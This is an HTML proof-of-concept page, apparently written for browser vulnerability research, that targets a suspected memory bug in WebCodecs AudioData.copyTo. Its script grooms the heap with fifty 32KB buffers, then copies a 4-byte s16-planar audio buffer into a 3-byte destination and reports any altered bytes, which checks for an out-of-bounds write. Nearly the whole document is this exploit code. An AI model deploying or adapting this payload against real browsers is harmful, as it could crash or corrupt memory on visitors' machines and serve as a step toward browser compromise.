<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebCodecs AudioData PoC</title>
    <style>
        #trigger {
            margin: 20px;
            padding: 8px;
            font-size: 16px;
            cursor: pointer;
            background-color: #f44336;
            color: white;
            border: none;
            border-radius: 4px;
        }
        #trigger:hover {
            background-color: #d32f2f;
        }
    </style>
</head>
<body>
    <h1>WebCodecs AudioData Crash PoC</h1>
    <p>Click to test AudioData.copyTo vulnerability</p>
    <button id="trigger">Trigger Exploit</button>
    <script>
        function stressHeap() {
            try {
                const buffers = [];
                for (let i = 0; i < 50; i++) {
                    const buf = new Uint8Array(32 * 1024);
                    buf.fill(0x41);
                    buffers.push(buf);
                }
                return buffers;
            } catch (e) {
                alert(`Heap stress error: ${e.message}`);
            }
        }

        function checkBufferChanges(buffer, expectedValue) {
            const result = new Uint8Array(buffer);
            let changes = [];
            for (let i = 0; i < result.length; i++) {
                if (result[i] !== expectedValue) {
                    changes.push(`Offset ${i}: 0x${result[i].toString(16).padStart(2, '0')}`);
                }
            }
            return changes;
        }

        function triggerCrash() {
            try {
                if (typeof AudioData === 'undefined') {
                    alert('AudioData not supported, WebCodecs unavailable');
                    return;
                }

                alert('Grooming heap with 50x32KB...');
                const heapBuffers = stressHeap();

                let rawData = new Uint8ClampedArray(4);
                rawData.fill(0x46);
                let audioData = new AudioData({
                    format: "s16-planar",
                    sampleRate: 1,
                    numberOfFrames: 1,
                    numberOfChannels: 2,
                    timestamp: 0,
                    data: rawData
                });

                let copyDestination = new Uint8ClampedArray(3);
                copyDestination.fill(0x48);
                alert('Executing copyTo...');
                audioData.copyTo(copyDestination, { planeIndex: 0 });

                const changes = checkBufferChanges(copyDestination, 0x48);
                if (changes.length > 0) {
                    alert(`Memory changes:\n${changes.join('\n')}`);
                } else {
                    alert('copyTo executed without crash or changes');
                }
            } catch (e) {
                alert(`Error: ${e.message}`);
            }
        }

        document.getElementById('trigger').addEventListener('click', triggerCrash);
    </script>
</body>
</html>
